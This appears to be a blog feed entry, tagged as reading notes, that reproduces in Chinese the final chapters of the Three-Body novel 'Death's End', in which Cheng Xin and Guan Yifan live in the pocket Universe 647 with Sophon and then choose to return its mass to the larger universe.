<p>这时，一个奇异的东西打断了他们的感慨，这是一个由微亮的细线画出的长方形，有一人高，在空地上飘浮着，看上去像用鼠标在现实的画面中拉出的一个方框。它在飘浮中慢慢移动，但移动的范围很小，飘不远就折回。很可能这东西一直存在，只是它的框线很细，发出的光也不强，白天看不见。不管它是场态还是实体，这肯定是一个智慧造物。勾画出长方形的亮线似乎与天空中线状的星星有某种神秘的联系。</p>
<p>“这会不会是他们送我们的那个小……小礼物？”程心盯着方框说。“不太可能吧，这东西能存放一千八百多万年？”</p>
<p>但这次他错了，这东西确实存放了一千八百九十万年，如果需要，还可以存放到宇宙末日，因为它在时间之外。最初它被放置在刻字的岩石旁边，还有一个实体的金属框架，但仅五十万年后金属就化为尘土。而这东西一直是崭新的，它不惧怕时间，因为它自己的时间还没有开始。本来它处在地层三十米深处，仍然在那块岩石旁，但它检测到了地面上的人，于是它升上地面，它与地层不发生作用，就像一个幻影。在地面上，它确认这两个人是它所等待的对象。“我觉得它像一扇门。”程心轻声说。</p>
<p>关一帆拾起一根小树枝向长方形扔去，树枝穿过它所围的空间，落到另一侧的地上。他们又看到，一群发着荧光的小气球飘过来，其中有几个穿过了长方形内部，安然无恙地飘走了，其中有一只甚至穿过了发光的框线。关一帆用手接触框线，手指与框线对穿而过，他没有任何感觉。无意中，他的手伸向长方形所围的空间。这确实是一个无意的动作，因为他感觉这片空间断面肯定是什么都没有的，但程心惊叫了一声，沉稳的她很少发出这样的叫声。关一帆急忙把手抽回，手和手臂都完好无损。</p>
<p>“刚才你的手没穿过去！”程心指着长方形的另一侧说。关一帆又试了一次，手和一段小臂穿过方框平面就消失了，确实没有在另一侧出现。而从另一侧，程心看到他小臂的断面，像镜面一样，骨骼和肌腱清晰可见。他抽回手，又拾起一根树枝试试，树枝穿过了方框。紧接着，两只螺旋桨状的飞虫也穿过了方框。</p>
<p>“这确实是一扇门，有智能识别功能的门。”关一帆说。“它让你进去。”</p>
<p>“可能你也行。”程心小心地试了一下，她的手臂也能进入“门”，关一帆从另一侧看到她的小臂断面时，对这情景似曾相识。</p>
<p>“你等着我，我过去看看就来。”关一帆说。“我们一起去。”程心坚定地说。</p>
<p>“不，你在这里等我。”程心扳着关一帆的双肩使他面向自己，注视着他的眼睛说：“你想让我们也隔开一千八百万年吗？！”</p>
<p>关一帆长时间地注视着程心，终于点点头，“我们是不是还能带些东西过去？”十分钟后，他们手拉手穿过了门。</p>
<p>时间之外，我们的宇宙</p>
<p>2016-02-01</p>
<p>时间之外</p>
<p>我们的宇宙混沌未开的黑暗。</p>
<p>程心和关一帆再次进入时间真空。这与他们在穿梭机中穿越低光速时十分相似，这里的时间流速为零，或者说没有时间。他们失去了时间感，代之以一种跨越感，在一切之外跨越一切的感觉。黑暗消失，时间开始了。人类的语言中没有相应的词汇表达时间开始的时刻，说他们进入后时间开始了是不对的，“后”是一个时间概念，这里没有时间，也就没有先后。他们进入“后”的时间可以短于亿亿分之一秒，也可以长于亿亿年。</p>
<p>太阳亮起来，它亮得很慢，最初只能显示自己的圆盘形状，然后才用阳光揭开这个世界的面纱，像一首乐曲，从几乎听不见的音调渐渐流淌开来。太阳的周围出现一圈蓝色，慢慢扩展开来形成一片蓝天。在蓝色天空下，一片田园渐渐显形，或者说这只是田园的一角，有一片未播种的土地，土壤是黑色的。在土地旁有几幢精致的白色房子，还有几棵树，这树是唯一能带来异域色彩的东西，树的叶子阔大，形状奇异。在渐渐亮起来的太阳下，这片幽静的田园像对他们张开的怀抱。“有人！”关一帆指着远方说。</p>
<p>在地平线上，有两个人的背影，可以看出是一男一女，男人刚刚把手臂放下。“那是我们。”程心说。</p>
<p>在那两个人前面更远处，也可以看到白房子和树，与这里的完全一样，由于角度原因看不到地面，但可以预料那里也有一块同这里一样的黑色田地。也就是说，在这个世界的尽头，又有一个该世界的复制品，也可能是映像。世界的复制品和映像在周围都存在，他们向两侧看，都看到一个同样的田园世界，他们也在那个世界中，但只能看到背影，他们转头时复制世界中的人也同时转头。他们向后看，吃惊地发现身后也是一个同样的田园世界，只不过他们是在从另一个方向看，那个田园中的他们远在另一端。</p>
<p>进入这个世界的入口无影无踪。他们沿着一条石块铺出的小径向前走，周围所有复制世界中的他们也同时走动。一条小溪把小路切断了，溪上没有桥，但抬腿就能跳过去，这时他们才意识到这里有1G的正常重力。他们走过那几棵树，来到白房子前，发现房门关着，窗子被蓝色窗帘遮掩。这一切都是崭新的，一尘不染。它们也确实是崭新的，时间在这里刚刚开始流动。在房子前堆放着一些简单原始的农具，有铁锹、钉耙、筐子和水桶等，虽然形状有些变异，但完全能看出它们的用途。最引人注目的是立在农具旁的一排金属柱状物，它们都有一人高，光滑的外壳在阳光下闪亮，每个上面都有四个金属部件，可以看出是折合的四肢，这些金属柱可能是关闭中的机器人。</p>
<p>他们决定先熟悉周围的环境再进入这些房子，于是继续向前走，很快来到了这个小世界的边缘。现在，他们面对着前面的复制世界，最初，他们以为那是个映像，虽然无法解释它的方向，但走到一半时就否定了这个想法，因为那个复制世界太真切了，不像在镜子中。果然，他们向前迈一步就毫无阻碍地进入了复制世界，四下看看，程心的心中升起了一丝恐惧。一切都恢复到他们刚进入时的状态：他们身处一个与刚才一模一样的田园中，前方、两侧都是这个田园的复制世界，在这些复制世界中，他们也存在。回头看看，在他们刚刚迈出的田园中，他们正在田园最远的一侧，也在回头看。</p>
<p>2016-02-01</p>
<p>程心听到关一帆长长地出了一口气，“好了，不要再走了，永远走不完。”他指指天和地，“这两个方向有阻挡，要不也能看见同样的世界。”</p>
<p>“你知道这是什么？”“你听说过查尔斯·米什内尔这个人吗？”</p>
<p>“没有。”“他是公元世纪的一个物理学家，他是最早想象出这种东西的人。我们所在的世界其实很简单，是一个正立方体，边长我估计在一千米左右，你可以把它想象成一个房间，有四面墙，加上天花板和地板。但这房间的奇怪之处在于，它的天花板就是地板，在四面墙中，相对两面墙其实是一面墙，所以它实质上只有两面墙。如果你从一面墙前向对面的墙走去，当你走到对面的墙时，你立刻就回到了你出发时的那面墙前。天花板和地板也一样。所以，这是一个全封闭的世界，走到尽头就回到起点。至于我们周围看到的这些映像，也很简单，只是到达世界尽头的光又返回到起点的缘故。咱们现在还是在刚才的那个世界中，是从尽头返回起点，只有这一个世界，其他都是映像。”</p>
<p>“那，这好像是……”“这就是！”关一帆做了一个囊括一切的手势，感慨道，“云天明曾送你一颗星星，现在，他又送你一个宇宙。程心，这是一个宇宙，虽然很小，可确实是一个宇宙。”</p>
<p>2016-02-01</p>
<p>在程心激动地打量着这个小宇宙时，关一帆悄悄地坐在田埂上，抓起一把黑土，看着土顺指流下，心情有些低落，“他是最厉害的男人，能把星星和宇宙当礼物送给他爱的人，可，程心，我什么也送不了你。”</p>
<p>程心也坐下来，伏在他的肩上笑着说：“可你是宇宙中唯一的男人了，不需要再送什么。”关一帆的心里还是有些自卑，但让他感到欣慰的是，宇宙中没人同他竞争了。</p>
<p>2016-02-01</p>
<p>他们起身向智子走去，双方在一棵大树下会面了。程心再次确定了她就是智子，那美得有些不真实的相貌一点都没有变。</p>
<p>智子向程心和关一帆深深鞠躬，起身后对程心微笑着说：“我说过，宇宙很大，生活更大，我们真的又相会了。”</p>
<p>2016-02-01</p>
<p>智子又鞠躬，“欢迎你们来到647号宇宙，我是这个宇宙的管理者。”</p>
<p>2016-02-01</p>
<p>“宇宙管理者？”关一帆吃惊地看着智子说，“这是个好伟大的名字，特别是对我这样一个研究宇宙学的人来说，听起来像……”“呵呵，不，”智子笑着摆摆手，“你们是647号真正的主人，拥有对这里一切事物的绝对决定权，我只是为你们服务的。”</p>
<p>智子做了个邀请的手势，程心和关一帆跟着她沿田埂走去，一直进入一幢白房中的一间雅致的客厅。客厅的装饰风格是中式的，墙上挂着几幅淡雅的字画，程心特别注意看其中有没有“星环”号从冥王星上带出来的文物，好像没看到。在一个古色古香的木制书案旁入座后，智子为他们倒茶，这一次没有了茶道的繁琐程序。那些茶叶像是龙井，一根根在杯底竖起来，形成一片绿色的小林，散发出一阵清香。</p>
<p>2016-02-01</p>
<p>这一切在程心和关一帆的眼中如梦似幻。</p>
<p>智子说：“这个宇宙，是一个赠品，是云天明先生赠送给二位的。”“我想是赠给程心的吧。”关一帆说。</p>
<p>“不，受赠者肯定包括您，后来的识别系统中增加了您的权限，否则您是不可能进入的。云天明先生希望你们在这个小宇宙中，躲过我们的大宇宙的末日，就是大坍缩，在新的大爆炸后进入新的大宇宙。他希望你们看到新宇宙的田园时代。现在，我们处于一个独立的时间线中，大宇宙的时间正在飞速流逝，你们肯定能够在有生之年等到它的末日。按更具体的估算，大宇宙的坍缩将在十年内达到奇点状态。”“如果新的创世爆炸发生，我们怎么能知道呢？”关一帆问。</p>
<p>“我们能知道的，我们能够通过超膜检测大宇宙的状态。”智子的话让程心想到了云天明和艾AA刻在岩石上的字，但关一帆想到的更多，他注意到了智子提到的一个词：田园时代。用这个词描述宇宙的和平年代是银河系人类的说法。这里有两个可能：一是巧合，三体世界也正好选择了这个词；第二种可能性就十分可怕——三体世界已经侦测到银河系人类的存在，由云天明快速赶到蓝星可知，三体第一舰队的世界距银河系人类的世界已经很近了。现在，三体文明已经发展到能够建立小宇宙了，这对银河系人类是一个巨大的威胁。</p>
<p>但他立刻笑出声来。“你笑什么？”程心奇怪地问。</p>
<p>“笑我可笑。”确实可笑，即使在进入小宇宙之前，距他离开银河系人类的二号世界也已经一千八百九十万年了，现在，他来自的大宇宙可能已经过去几亿年，他是在替古人担忧。</p>
<p>2016-02-01</p>
<p>“你见过云天明吗？”程心问。</p>
<p>智子轻轻摇头，“没有，从来没有。”“那艾AA呢？”“我最后一次见她是在地球上了，以后再也没见过。”</p>
<p>“那你是怎么到这里来的呢？”“647号宇宙是一个订制产品，完成后我就在这里了，我嘛，本质上只是个数据体而已，可以拷贝许多份。”</p>
<p>“可是你知道吗，云天明把这个宇宙带到了蓝星？”“我不知道蓝星是什么，如果是一颗行星的话，他不可能把647号带到那里，因为647号本身是一个独立的宇宙，不在大宇宙内部，他只能把647号的入口带到那里去。”</p>
<table>
<thead>
<tr>
<th>注</th>
<th>指针</th>
</tr>
</thead>
<tbody>
<tr>
<td></td>
</tr>
</tbody>
</table>
<p>2016-02-01</p>
<p>“云天明和艾AA为什么不到这里来呢？”关一帆问。这也是程心最想知道的，她之所以还没问，是怕得到一个悲哀的答案。</p>
<p>智子又摇摇头，“不知道。识别系统中一直有云天明的权限。”“还有别人的吗？”</p>
<p>“没有，到目前为止只有你们三个人。”沉默许久后，程心轻声对关一帆说：“AA是一个很注重现世生活的人，她不会对几百亿年后的新宇宙感兴趣。”</p>
<p>“我感兴趣。”关一帆说，“我很想看看新宇宙是什么样子，特别是当它还没有被生命和文明篡改扭曲的时候，它一定体现着最高的和谐与美。”程心说：“我也想去新宇宙，奇点和大爆炸会把这个宇宙的一切记忆都抹去，我想把人类的一部分记忆带到新宇宙去。”智子对程心郑重地点点头，“这是一项伟大的事业，已经有人在做了，不过你是做这事的第一个太阳系人类。”</p>
<p>“你的生活目标总是比我崇高。”关一帆在程心耳边低声说，程心也听不出他这话究竟是玩笑还是认真的。智子站起身说：“那么，你们在647号宇宙的新生活就开始了，我们出去看看吧。”</p>
<p>2016-02-01</p>
<p>一出门，程心和关一帆就看到了一幅春耕的景象，那些柱状机器人都在田里干活，它们有的用钉耙平整田地（地很松，已经不用耕了），有的在平整好的田里播种。它们干农活的方式都十分原始，没有能拉的宽耙，只是用手握的小耙一点点地平地；也没有播种机，机器人一手提着一个装种子的袋子，一手把种子埋进地里。整个场景有一种古朴的色彩，在这里，机器人甚至比农夫更贴近自然一些。</p>
<p>2016-02-01</p>
<p>智子介绍说：“这里存储的粮食只够你们食用两年，以后就要靠种地生活了。现在播下的种子，都是程心给云天明带的那些种子的后代，当然都经过了改良。</p>
<p>2016-02-01</p>
<p>关一帆看着黑色的田地，有些迷惑，“我觉得，这里用培养槽无土栽培比较合理。”</p>
<p>程心说：“从地球出来的人，对土地都有一种迷恋“</p>
<p>2016-02-01</p>
<p>关一帆说：“太阳系人类为他们的土地流尽了最后一滴血，或者说，只剩下你和AA这两滴。可有什么用，还不是消失得无影无踪？现在那个大宇宙可能过去了几亿年，你真以为还有谁记得他们？迷恋土地和家园，已经不是孩子了却还是不敢出远门，这就是你们灭亡的根本原因。我说的是真话，不怕冒犯你。”</p>
<p>2016-02-01</p>
<p>647号宇宙中的一年过去了。</p>
<p>田里的小麦收获了两季，程心和关一帆两次看着翠绿的麦苗慢慢变成金黄的麦浪，旁边的菜地里也一直充盈着绿色。这个小小的庄园里有着完备的生活用品，所有的用品都没有商标，显然是在三体世界制造的，但在外形上与人类的产品完全一样，没有任何异域特征。</p>
<p>程心和关一帆有时到田里与机器人一起干农活，有时则在小宇宙中散步。散步时只需要一直走下去，只要不注意自己上次留下的脚印，就有穿过无穷无尽的小世界的感觉。但他们更多的时间是花在电脑前。在小宇宙中的任何位置都能够激活一个终端窗口，但他们不知道这个世界的电脑主机在哪里。电脑中有大量地球人类的文字和图像资料，大部分是广播纪元之前的，显然是三体世界收集的人类世界的信息，遍及科学和人文的所有领域；但更多的信息是三体文字的，数量巨大，浩如烟海，这也是他们最感兴趣的部分。</p>
<p>在电脑中找不到把三体文字翻译成人类文字的软件，于是他们开始学习三体文字，智子成了他们的老师。但他们很快发现这极其困难，原因在于三体文字是一种表意文字，与人类的表音文字不同，与语言无关，直接表达含义。人类在远古时代也出现过表意文字，比如一部分象形文字就是表意的，但后来消失了，人类的阅读习惯完全变成了表音的习惯。不过，他们发现这种困难只是在开始时存在，越往后越容易。他们经过艰难的两个月后，进步逐渐快起来。与表音文字相比，表意文字最大的优势在于阅读速度，这种文字阅读起来比表音文字至少快十倍。程心和关一帆开始磕磕绊绊地阅读三体文的文献资料。他们最初的目的有两个，一是想了解三体世界是如何记载他们与地球文明的那段历史，二是想知道这个小宇宙是如何建造的——对于后者，他们知道真正从专业角度了解不太可能，但至少应该从科普角度知道是怎么回事。智子说，要达到这两个目标，他们还需要一年时间进一步掌握三体文字，再用一年去阅读。</p>
<p>2016-02-01</p>
<p>建造小宇宙的基本原理确实令他们难以想象，即使是其中一些层次较低的奥秘他们也很长时间弄不明白。比如在一立方千米的空间中，生态循环是如何建立的？太阳是什么？它的能源从哪里来？最令人费解的是：作为一个完全封闭的系统，小宇宙中的热量到哪里去了？当然，他们最关心的是：小宇宙可以和大宇宙通信吗？智子告诉他们，小宇宙绝无可能向大宇宙传递信息，但接收到大宇宙的信息广播却是有可能的。她说，所有的宇宙都是一个超膜上的空泡（这涉及三体物理学和宇宙学中最基本的理论图景，对此她也无法进一步解释），大宇宙有足够的能量把信息在超膜上传播。但这很困难，需要难以想象的巨大能量，如果大宇宙这么做，可能需要把相当于一个银河系的质量化为纯能。其实，647号宇宙中的监测系统经常收到超膜上其他大宇宙的信息，有些是自然产生的，有些是无法解读的智慧信息，但从未收到他们所来的那个大宇宙的信息。</p>
<p>2016-02-01</p>
<p>时间一天天过去，像那条小溪中的水，平静而流畅。</p>
<p>程心开始写回忆录，记述她所知道的历史，她把它称为《时间之外的往事》。</p>
<p>2016-02-01</p>
<p>有时候，他们也设想新宇宙中的生活。智子告诉他们，按照宇宙学理论，新宇宙在宏观上一定是高于四维的，甚至很可能高于十维。当新宇宙诞生后，647号宇宙能在其中自动建立出口并检测周围的环境。如果新宇宙高于四维，小宇宙出口可以跨越空间进行移动，直至寻找到合适的生存环境；同时，还可与三体世界其他小宇宙的移民进行联系，当然，也可能与银河系人类的移民联系上。在新宇宙中，旧宇宙的移民几乎属于同一个种族了，应该可以共建一个世界。智子特别强调，在高维宇宙中，有一个因素使生存的几率大大增加：在众多的维度中，可能有多于一个的维度是属于时间的。</p>
<p>“多维时间？”程心一时无法理解这个概念意味着什么。“即使时间仅有二维，也将呈平面状而不是直线状，有无数个方向，那就意味着我们可以同时做出无数个选择。”关一帆解释说。</p>
<p>“这其中总有一个选择是对的。”智子说。</p>
<p>2016-02-01</p>
<p>在麦田第二次成熟后的一个深夜，程心醒来，发现关一帆出去了。她起身来到外面，看到太阳已经变成一轮明月，小世界沉浸在如水的月光中。她看到了关一帆，他正坐在小溪旁，她在他月光下的背影中看出了忧郁。</p>
<p>在这真正的二人世界，两个人都对彼此的精神状态十分敏感，程心已经发现关一帆有心事。其实，他在之前的大部分时间都处于一种很阳光的状态，直到几天前他还对程心说，如果他们真能在新宇宙中安定地生活，也许他们的孩子能够重建人类种族。但后来，他好像突然发现了什么，常常一个人长时间沉思，有时还在终端窗口计算着什么。程心在关一帆身边坐下，他把她轻轻搂在怀中。月光中的小世界十分宁静，只有小溪中的水声。月光照着成熟的麦田，明天就要收割了。“质量流失。”关一帆说。</p>
<p>程心没有说话，只是看着溪水中跳动的月光，她知道他会解释的。关一帆接着说：“我最近一直在看三体的宇宙学，刚刚看到了一个对宇宙数学之美的证据：宇宙在质量上的设计是极其精巧的，三体人已经证明，宇宙的总质量刚刚好能够使宇宙坍缩，一点不多，一点不少，总质量只要减少一点，宇宙就由封闭变成开放，永远膨胀下去。”</p>
<p>“可质量在流失。”程心说，她立刻意识到了他最后几句话的含义。“是啊，质量在流失。仅三体世界制造的小宇宙就有几百个，宇宙中的其他文明世界，为了逃避大坍缩，或为别的目的，又制造了多少？这些小宇宙都在带走大宇宙中的质量。”</p>
<p>“我们应该问问智子。”“我问过，她说截至647号宇宙建造完成时，按照三体世界观测的宇宙状态，还没有发现质量流失产生的任何影响，宇宙是封闭的，必定会坍缩。”</p>
<p>“那647号完成以后呢？”“她当然不知道了。她说，在宇宙文明中有一种智慧文明的群体，很像归零者，叫做回归运动，他们力图制止小宇宙的建造，并且呼吁把已经建成的小宇宙中的质量归还给大宇宙……但这方面的情况她知道得也不多。好了，不要再想这些了，我们不是上帝。”</p>
<p>“可是，咱们早就不得不想上帝要想的事了，不是吗？”他们一直坐在小溪旁，直到月亮变成太阳。</p>
<p>2016-02-01</p>
<p>小麦收割后的第三天，收获的麦子都已脱粒入仓。程心和关一帆站在地头，看着机器人翻耕土地，准备下一季的播种。现在仓库里已经堆满了粮食，再种小麦就没有地方放了。要是在以前，他们会热烈地讨论下一季地里种什么，但现在，程心和关一帆都心事重重，不再关心这些事。在整个收割和打场的过程中他们都待在房间里，讨论着各种可能的未来。两人发现，每一种他们个人生活的选择，最后都会涉及宇宙的命运，有时还涉及多个宇宙的命运，他们觉得自己真的像上帝了。这种宏大压得他们喘不过气来，于是一起来到外面。</p>
<p>2016-02-01</p>
<p>他们看到智子沿着田埂快步走来。智子从不干扰他们的生活，只有他们需要时才出现。而这次，她的步态不同以往，很急促，没有了一贯的优雅，脸上的紧张神情也是以前从未出现过的。“我们收到了大宇宙的超膜广播！”智子说，然后调出了一个终端窗口并把它放到很大，为了让他们看清窗口中的内容，她还调暗了太阳的亮度。</p>
<p>窗口中快速滚动着无数行符号，那是由超膜广播所发送的点阵图形显示的，那些符号奇形怪状，无法辨认。程心和关一帆还注意到，每一行符号都不是同一类型，它们滚滚而过，像波纹凌乱的湍急河面。“广播已经持续了五分钟，还在继续！”智子指着窗口说，“其实广播的信息很简短，持续这么长时间是因为使用不同的语言，现在已经出现了几万种语言，哦，到十万种了！”</p>
<p>“这是对所有小宇宙广播吗？”程心问。“肯定是，还能是对谁呢？动用这么大的能量，应该是重要信息。”</p>
<p>“有三体和地球语言吗？”“没有。”</p>
<p>程心和关一帆很快明白，这是一个宇宙文明的生死簿。现在，大宇宙可能已经过去上百亿年，不管广播信息的内容是什么，如果一个文明的语言能够被列在广播信息中，那只有两种可能：这个文明仍然存在；或者，这个文明存在过，且生存了相当长的时间，它的文化在宇宙中留下了永久的印记。符号的大河从信息窗口中浩荡流过，已经广播了二十万种语言，三十万、四十万……一百万种语言，数量还在增加。</p>
<p>三体语言和地球语言依然没有出现。“没什么，我们知道自己活过，生活过。”程心说，她和关一帆紧紧地依偎在一起。</p>
<p>“三体！”智子突然喊道，一手指着显示窗口，这时广播的语言种类已经增加到一百三十万左右，窗口中有一条三体文字的信息一闪而过，程心和关一帆不可能看清，但智子能看清。“地球！”仅仅几秒钟后，智子又喊道。</p>
<p>当广播信息的语言种类达到一百五十七万时，广播结束了。信息窗口中的滚动显示消失了，只静止地显示出两条分别用三体和地球语言书写的信息。程心和关一帆没有看清信息的内容，泪水模糊了他们的双眼。</p>
<p>在这宇宙的最后审判日，地球和三体两个文明的两个人和一个机器人激动地拥抱在一起。他们知道，语言和文字的进化是很快的，如果两个文明存在了相当长的时间，甚至现在仍然存在，他们的文字肯定与现在显示的完全不同，但要让小宇宙中的人看懂，只能用古文字显示。与大宇宙中曾经生存过的文明总数相比，一百五十七万是个相当小的数字。</p>
<p>在银河系猎户旋臂的漫漫长夜中，有两颗文明的流星划过，宇宙记住了它们的光芒。</p>
<p>2016-02-01</p>
<p>程心和关一帆平静下来后，仔细阅读信息的内容，两种语言书写的内容是一样的，很简短：</p>
<p>回归运动声明：我们宇宙的总质量减少至临界值以下，宇宙将由封闭转变为开放，宇宙将在永恒的膨胀中死去，所有的生命和记忆都将死去。请归还你们拿走的质量，只把记忆体送往新宇宙。</p>
<p>2016-02-01</p>
<p>程心和关一帆把目光从回归运动声明上移开，相互对视着。从对方的眼睛里，他们看到了大宇宙黑暗的前景。在永远的膨胀中，所有的星系将相互远离，一直退到各自的视线之外，到那时，从宇宙间的任何一点望去，所有的方向都是一片黑暗。恒星将相继熄灭，实体物质将解体为稀薄的星云，寒冷和黑暗将统治一切，宇宙将变成一座空旷的坟墓，所有的文明和所有的记忆都将被永远埋葬在这座无边无际的坟墓中，一切都永远死去。</p>
<p>为了避免这个未来，只有把不同文明制造的大量小宇宙中的物质归还给大宇宙，但如果这样做，小宇宙中将无法生存，小宇宙中的人也只能回归大宇宙，这就是回归运动。两人的目光已经交流了一切，并且做出了最后的决定，但程心还是说出了她想说的话：</p>
<p>“我想回去，但如果你想留在这里，我也跟你留下。”她对关一帆说。关一帆缓缓摇摇头，“我是研究直径一百六十亿光年的大宇宙的，不想在这个只有一千米宽的宇宙里度过一生。我们回去吧。”</p>
<p>“我不建议你们这么做。”智子说，“我们无法精确测定大宇宙中时间的流逝速度，但可以肯定，距你们从蓝星进入这里到现在，大宇宙至少过去了上百亿年，蓝星早就没有了，云天明送给你的那个太阳也早就熄灭了，我们现在根本不知道大宇宙是什么样子的环境，甚至不知道那个宇宙还是不是三维的。”“小宇宙的门不是能够以光速移动吗，能不能找到一个可以生存的环境？”关一帆问。</p>
<p>“如果你们坚持，我就找找看吧。不过，我还是觉得留在这里是最好的选择。留在小宇宙中有两种可能的未来：如果回归运动成功了，大宇宙坍缩为奇点并发生新的创世大爆炸，你们就可以到新宇宙去；如果回归运动失败了，大宇宙死了，你们还可以在这里度过一生，这个小宇宙也不错的。”“如果所有小宇宙中的人都这么想，那大宇宙肯定死了。”程心说。智子无言地看着程心，对于她的思维速度而言，这段时间可能有几个世纪那么长。很难想象软件算法能够产生这样复杂的目光和表情，显然，智子的A.I.软件把与程心相识以来的所有记忆数据都检索出来了，这数据有近两千万年的跨度，这所有的记忆都凝结在她的目光中，悲哀、敬佩、惊奇、责备、惋惜……种种复杂的感情混杂在一起。</p>
<p>“你还是在为责任活着。”智子对程心说。</p>
<p>2016-02-01</p>
<p>《时间之外的往事》</p>
<p>（节选）责任的阶梯</p>
<p>我的一生，就是在攀登一道责任的阶梯。小时候，我的责任是好好学习，做一个好孩子，不要让爸爸妈妈失望。</p>
<p>以后在中学和大学，我的责任仍然是努力学习，使自己成为一个有能力的优秀的人，不要让社会失望。从读博士开始，我的责任变得具体了，我要为运载火箭的进步做出自己的贡献，要制造出推力更大、更可靠的火箭，把很少的人和物资送到地球轨道上。</p>
<p>后来进入PIA，我的责任变成把一个探测器送到一光年以外的太空中，与入侵的三体舰队相会。这个距离，是我以前参与研制的运载火箭飞行距离的百亿倍。然后，我得到了一颗星星，在新纪元，它给我带来了以前难以想象的责任，我成为黑暗森林威慑的执剑人。现在看来，说那时自己掌握着人类的命运有些言过其实，但我确实掌握着两个文明历史的走向。</p>
<p>后来，责任变得复杂起来，我想让人类插上光速飞行的翅膀，却又不得不做相反的事：制止由此引发的战争。我不知道那些灾难和太阳系最后的毁灭与我有多大关系，这是永远无法证实的，但肯定与我有关系，与我的责任有关系。现在，我将登上责任的顶峰，要为宇宙的命运负责了。当然，要为此负责的不止我们两个人，但这责任有我们的一份，这样的责任，在以前是绝对无法想象的。</p>
<p>我要对相信上帝存在的人们说，我不是它选定的；我也要对唯物主义者们说，我不是创造历史的人。我只是一个普通人，不幸的是没有能够走过一个普通人的生活道路，我的经历其实是一个文明的历程。现在我们知道，每个文明的历程都是这样：从一个狭小的摇篮世界中觉醒，蹒跚地走出去，飞起来，越飞越快，越飞越远，最后与宇宙的命运融为一体。</p>
<p>对于智慧文明来说，它们最后总变得和自己的思想一样大。</p>
<p>2016-02-01</p>
<p>智子通过647号宇宙的控制系统，操纵小宇宙处于大宇宙中的门，门在大宇宙中快速移动，寻找着适合生存的世界。门与小宇宙的通信能够传递的信息十分有限，不能传输图像，只能发回对环境的评估结果，这是在负十到十之间的一个数字，表示环境的生存级别，只有级别大于零的环境，人类才能在其中生存。</p>
<p>门在大宇宙中进行了上万次跳跃移动，这过程耗费了三个月，只有一次检测到一个三级环境，智子不得不承认，这就是最好的结果了。</p>
<p>2016-02-01</p>
<p>接着，647号宇宙开始向大宇宙归还物质。</p>
<p>据智子介绍，小宇宙本身是没有质量的，它的质量都来自于从大宇宙中带来的物质。在三体世界曾经制造过的几百个小宇宙中，647号属于最小的一类，它总共从大宇宙中带走了约五十万吨物质，相当于公元世纪一艘大型油轮的运载量，从宇宙尺度上讲确实微不足道。</p>
<p>2016-02-01</p>
<p>物质搬运首先从土壤开始。自从第二次收割后，田地就没有再播种，机器人们用干农活的小推车装运潮湿的土壤，到达门前时，两个机器人抬起小车把土倾倒到门里——在经过长方形平面后，土消失了。土壤的搬运进行得很快，三天后，小宇宙中已经没有一粒土了，房子周围的那几棵树也送进了门中。</p>
<p>土壤消失后，小宇宙出现了一片金属的地面。这地面由一片片光洁的金属板拼接而成，像镜子一样倒映着太阳。机器人从地面的一侧把金属板拆下来，把它们一块块推进门。在小世界一侧被掀开的地面下，露出了一艘小型飞船。这艘飞船只有十几米长，却浓缩了三体世界最先进的技术。它是按地球人类的人体工程学设计，可乘坐三名乘员，装备了核聚变和曲率驱动两套动力系统，有适合人类的迷你型生态循环系统和冬眠装置，像“星环”号一样可以直接在行星上降落和起飞。也许是为了方便通过小宇宙的门，它的外形呈细长的流线型。这艘飞船原本设想是由647号宇宙中的人进入新宇宙时使用，在新宇宙中找到合适的生存环境前，它可以维持相当长的时间；现在，他们将乘坐它返回大宇宙。</p>
<p>2016-02-01</p>
<p>智子拿着一个金属盒，那是他们要留在小宇宙中的东西，是要送往新宇宙的漂流瓶。它的主体是一台微型电脑，电脑的量子存储器中存储着小宇宙电脑主机的全部信息，这几乎是三体和地球文明的全部记忆了。当新宇宙诞生时，金属盒会收到门发来的信号，然后用自己的小推进器穿过门，进入新宇宙。它会在新宇宙的高维太空中飘浮，等待着被拾取和解读的那一天。同时，它还会用中微子束把自己存储的信息不断地播放出来，如果新宇宙中也有中微子的话。</p>
<p>程心和关一帆相信，其他的小宇宙，那些响应回归运动呼吁的小宇宙，也在做着同样的事。如果新宇宙真的诞生，其中会有许多来自旧宇宙的漂流瓶。可以相信，相当一部分漂流瓶中的记忆体里存储的信息可能达到这样的程度：记录了那个文明每一个个体的全部记忆和意识，以及每个个体的全部生物学细节，以至于新宇宙中的文明可以根据这些信息复原那个文明。</p>
<p>2016-02-01</p>
<p>还可以再留下五公斤吗？”程心问道。她在飞船的另一侧，身穿太空服，手中举着一个发光的透明球体，球体直径约半米，里面飘浮着几个水球，有的里面游动着几条小鱼，有的里面生长着绿藻；还有两块飘浮的微型陆地，上面长着嫩绿的青草。光亮是从球体顶部发出的，那里安装着一个小小的发光体，是这个小世界的太阳。这是一个全封闭的生态球，是程心和智子十多天的工作成果，只要球体内的小太阳还能够发光，这个小小的生态系统就能生存下去。只要有它留在这里，647号宇宙就不是一个没有生命的黑暗世界。</p>
<p>“当然可以，大宇宙不会因为这五公斤就不坍缩了。”关一帆说，他还有一个没说出来的想法：也许大宇宙真的会因为相差一个原子的质量而由封闭转为开放。大自然的精巧有时超出想象，比如生命的诞生，就需要各项宇宙参数在几亿亿分之一精度上的精确配合。但程心仍然可以留下她的生态球，因为在那无数文明创造的无数小宇宙中，肯定有相当一部分不响应回归运动的号召，所以，大宇宙最终被夺走的质量至少有几亿吨，甚至可能是几亿亿亿吨。但愿大宇宙能够忽略这个误差</p>
<p>2016-02-01</p>
<p>聚变发动机启动了，推进器发出幽幽的蓝光，飞船缓缓地穿过了宇宙之门。</p>
<p>小宇宙中只剩下漂流瓶和生态球。漂流瓶隐没于黑暗里，在一千米见方的宇宙中，只有生态球里的小太阳发出一点光芒。在这个小小的生命世界中，几只清澈的水球在零重力环境中静静地飘浮着，有一条小鱼从一只水球中蹦出，跃入另一只水球，轻盈地穿游于绿藻之间。在一小块陆地上的草丛中，有一滴露珠从一片草叶上脱离，旋转着飘起，向太空中折射出一缕晶莹的阳光</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;三体-读书笔记&quot;&gt;&lt;a href=&quot;#三体-读书笔记&quot; class=&quot;headerlink&quot; title=&quot;三体 读书笔记&quot;&gt;&lt;/a&gt;三体 读书笔记&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;   Note:以前是在前大一(重庆,2010年吧),在小高同学的推荐下看
    
    </summary>
    
      <category term="文学" scheme="http://www.wanglinzhizhi.me/categories/%E6%96%87%E5%AD%A6/"/>
    
    
